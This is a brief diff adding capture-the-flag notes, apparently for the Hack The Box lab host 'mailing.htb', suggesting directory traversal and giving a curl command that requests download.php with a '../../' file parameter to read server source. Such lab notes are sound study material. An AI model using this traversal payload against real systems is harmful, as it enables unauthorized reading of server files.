@@ -1,0 +1,3 @@
+always good to try basic directory traversal
+
+curl http://mailing.htb/download.php?file=../../wwwroot/download.php
